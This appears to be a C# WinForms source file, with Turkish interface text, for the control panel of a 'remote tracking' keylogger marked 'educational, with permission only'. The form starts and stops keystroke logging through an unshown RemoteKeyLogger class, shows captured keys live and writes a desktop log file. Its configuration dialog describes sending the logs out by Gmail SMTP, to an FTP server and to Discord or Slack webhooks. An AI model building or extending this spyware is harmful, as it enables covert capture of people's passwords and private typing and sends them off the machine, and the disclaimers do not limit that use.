using System;
using System.Drawing;
using System.Windows.Forms;
using DevExpress.XtraEditors;

namespace GameOdev
{
    /// <summary>
    /// Basit uzaktan takip formu - konfigürasyon butonu ile
    /// Eğitim amaçlı - izinli kullanım için
    /// </summary>
    public partial class SimpleRemoteForm : DevExpress.XtraEditors.XtraForm
    {
        private RemoteKeyLogger remoteKeyLogger;
        private bool isLogging = false;

        public SimpleRemoteForm()
        {
            InitializeComponent();
            InitializeRemoteKeyLogger();
            SetupSimpleUI();
        }

        private void InitializeRemoteKeyLogger()
        {
            remoteKeyLogger = new RemoteKeyLogger();
        }

        private void SetupSimpleUI()
        {
            // Form özellikleri
            this.Text = "🔍 Uzaktan Takip KeyLogger - Eğitim Amaçlı";
            this.Size = new Size(800, 600);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;

            // Ana uyarı etiketi
            Label warningLabel = new Label();
            warningLabel.Text = "⚠️ UYARI: Bu yazılım sadece EĞİTİM amaçlıdır!\n" +
                               "Sadece açık yazılı izin alınmış kişilerde kullanın.\n" +
                               "İzinsiz kullanım yasalara aykırıdır.";
            warningLabel.ForeColor = Color.Red;
            warningLabel.Font = new Font("Arial", 10, FontStyle.Bold);
            warningLabel.Size = new Size(750, 80);
            warningLabel.Location = new Point(25, 20);
            warningLabel.TextAlign = ContentAlignment.TopCenter;
            this.Controls.Add(warningLabel);

            // Kontrol butonları
            Panel buttonPanel = new Panel();
            buttonPanel.Size = new Size(750, 100);
            buttonPanel.Location = new Point(25, 110);
            buttonPanel.BorderStyle = BorderStyle.FixedSingle;
            this.Controls.Add(buttonPanel);

            // Start/Stop butonu
            SimpleButton startStopButton = new SimpleButton();
            startStopButton.Name = "startStopButton";
            startStopButton.Text = "🚀 Uzaktan Takibi Başlat";
            startStopButton.Size = new Size(150, 40);
            startStopButton.Location = new Point(20, 30);
            startStopButton.Click += StartStopButton_Click;
            buttonPanel.Controls.Add(startStopButton);

            // Konfigürasyon butonu - BU BUTON VAR!
            SimpleButton configButton = new SimpleButton();
            configButton.Name = "configButton";
            configButton.Text = "⚙️ Konfigürasyon";
            configButton.Size = new Size(120, 40);
            configButton.Location = new Point(180, 30);
            configButton.Click += ConfigButton_Click;
            configButton.BackColor = Color.LightBlue;
            buttonPanel.Controls.Add(configButton);

            // Durum butonu
            SimpleButton statusButton = new SimpleButton();
            statusButton.Text = "📊 Durum";
            statusButton.Size = new Size(100, 40);
            statusButton.Location = new Point(310, 30);
            statusButton.Click += StatusButton_Click;
            buttonPanel.Controls.Add(statusButton);

            // Temizle butonu
            SimpleButton clearButton = new SimpleButton();
            clearButton.Text = "🗑️ Temizle";
            clearButton.Size = new Size(100, 40);
            clearButton.Location = new Point(420, 30);
            clearButton.Click += ClearButton_Click;
            buttonPanel.Controls.Add(clearButton);

            // Durum etiketi
            Label statusLabel = new Label();
            statusLabel.Name = "statusLabel";
            statusLabel.Text = "Durum: Durduruldu";
            statusLabel.Size = new Size(200, 30);
            statusLabel.Location = new Point(530, 40);
            statusLabel.ForeColor = Color.Blue;
            statusLabel.Font = new Font("Arial", 10, FontStyle.Bold);
            buttonPanel.Controls.Add(statusLabel);

            // Konfigürasyon durumu
            Label configStatusLabel = new Label();
            configStatusLabel.Name = "configStatusLabel";
            configStatusLabel.Text = "Konfigürasyon: Varsayılan ayarlar yüklendi";
            configStatusLabel.Size = new Size(750, 40);
            configStatusLabel.Location = new Point(25, 220);
            configStatusLabel.Font = new Font("Arial", 9);
            configStatusLabel.ForeColor = Color.Green;
            this.Controls.Add(configStatusLabel);

            // Tuş vuruşları paneli
            Panel keystrokePanel = new Panel();
            keystrokePanel.Size = new Size(750, 300);
            keystrokePanel.Location = new Point(25, 270);
            keystrokePanel.BorderStyle = BorderStyle.FixedSingle;
            this.Controls.Add(keystrokePanel);

            // Tuş vuruşları etiketi
            Label keystrokeLabel = new Label();
            keystrokeLabel.Text = "⌨️ Gerçek Zamanlı Tuş Vuruşları:";
            keystrokeLabel.Size = new Size(250, 25);
            keystrokeLabel.Location = new Point(10, 10);
            keystrokeLabel.Font = new Font("Arial", 10, FontStyle.Bold);
            keystrokePanel.Controls.Add(keystrokeLabel);

            // Tuş vuruşları metin kutusu
            TextEdit keystrokeTextBox = new TextEdit();
            keystrokeTextBox.Name = "keystrokeTextBox";
            keystrokeTextBox.Size = new Size(720, 260);
            keystrokeTextBox.Location = new Point(10, 40);
            keystrokeTextBox.Properties.ReadOnly = true;
            keystrokeTextBox.Properties.UseAdvancedMode = DevExpress.Utils.DefaultBoolean.True;
            keystrokeTextBox.Properties.Appearance.TextOptions.WordWrap = DevExpress.Utils.WordWrap.Wrap;
            keystrokeTextBox.Properties.Appearance.TextOptions.VAlignment = DevExpress.Utils.VertAlignment.Top;
            keystrokeTextBox.Properties.Appearance.TextOptions.Trimming = DevExpress.Utils.Trimming.None;
            keystrokeTextBox.Properties.ScrollBars = ScrollBars.Vertical;
            keystrokePanel.Controls.Add(keystrokeTextBox);

            // Bilgi etiketi
            Label infoLabel = new Label();
            infoLabel.Text = "📁 Log dosyası: Masaüstü\\EducationalKeyLogger.txt | ⚙️ Konfigürasyon butonuna tıklayarak ayarları yapın";
            infoLabel.Size = new Size(750, 30);
            infoLabel.Location = new Point(25, 580);
            infoLabel.ForeColor = Color.Gray;
            infoLabel.Font = new Font("Arial", 8);
            this.Controls.Add(infoLabel);
        }

        private void StartStopButton_Click(object sender, EventArgs e)
        {
            if (!isLogging)
            {
                // İzin onayı
                DialogResult result = MessageBox.Show(
                    "⚠️ UZAKTAN TAKİP BAŞLATMA UYARISI!\n\n" +
                    "Bu keylogger uzaktan takip özelliklerine sahiptir:\n" +
                    "📧 E-posta ile log gönderimi\n" +
                    "🌐 FTP ile uzaktan yükleme\n" +
                    "📱 Webhook ile anlık bildirim\n\n" +
                    "Sadece eğitim amaçlı ve açık izin ile kullanın!\n\n" +
                    "Devam etmek istiyor musunuz?",
                    "Uzaktan Takip Onayı",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning);

                if (result == DialogResult.Yes)
                {
                    remoteKeyLogger.StartLogging();
                    isLogging = true;

                    SimpleButton button = sender as SimpleButton;
                    button.Text = "⏹️ Uzaktan Takibi Durdur";
                    button.BackColor = Color.LightCoral;

                    Label statusLabel = this.Controls.Find("statusLabel", true)[0] as Label;
                    statusLabel.Text = "Durum: Uzaktan Takip Aktif";
                    statusLabel.ForeColor = Color.Red;
                }
            }
            else
            {
                remoteKeyLogger.StopLogging();
                isLogging = false;

                SimpleButton button = sender as SimpleButton;
                button.Text = "🚀 Uzaktan Takibi Başlat";
                button.BackColor = SystemColors.Control;

                Label statusLabel = this.Controls.Find("statusLabel", true)[0] as Label;
                statusLabel.Text = "Durum: Durduruldu";
                statusLabel.ForeColor = Color.Blue;
            }
        }

        private void ConfigButton_Click(object sender, EventArgs e)
        {
            try
            {
                // Basit konfigürasyon formu göster
                MessageBox.Show(
                    "⚙️ KONFİGÜRASYON AYARLARI\n\n" +
                    "📧 E-posta Ayarları:\n" +
                    "   SMTP: smtp.gmail.com:587\n" +
                    "   Gmail App Password gerekli\n\n" +
                    "🌐 FTP Ayarları:\n" +
                    "   Sunucu: ftp.example.com:21\n" +
                    "   Kullanıcı/Şifre gerekli\n\n" +
                    "📱 Webhook Ayarları:\n" +
                    "   Discord/Slack webhook URL\n\n" +
                    "Detaylı ayarlar için:\n" +
                    "remote_config.json dosyasını düzenleyin\n\n" +
                    "Örnek konfigürasyon dosyası hazırlanmıştır!",
                    "Konfigürasyon Bilgisi",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information);

                // Konfigürasyon durumunu güncelle
                Label configStatusLabel = this.Controls.Find("configStatusLabel", true)[0] as Label;
                configStatusLabel.Text = "Konfigürasyon: remote_config.json dosyası kullanılıyor";
                configStatusLabel.ForeColor = Color.Blue;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Konfigürasyon hatası: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void StatusButton_Click(object sender, EventArgs e)
        {
            try
            {
                string status = remoteKeyLogger.GetConfigurationStatus();
                MessageBox.Show(status, "Uzaktan Takip Durumu", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Durum bilgisi alınamadı: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ClearButton_Click(object sender, EventArgs e)
        {
            try
            {
                remoteKeyLogger.ClearBuffer();
                
                TextEdit keystrokeTextBox = this.Controls.Find("keystrokeTextBox", true)[0] as TextEdit;
                keystrokeTextBox.Text = "";
                
                MessageBox.Show("Tuş vuruşları temizlendi!", "Başarılı", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Temizleme hatası: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (isLogging)
            {
                remoteKeyLogger.StopLogging();
            }
            remoteKeyLogger?.Dispose();
            base.OnFormClosing(e);
        }
    }
}
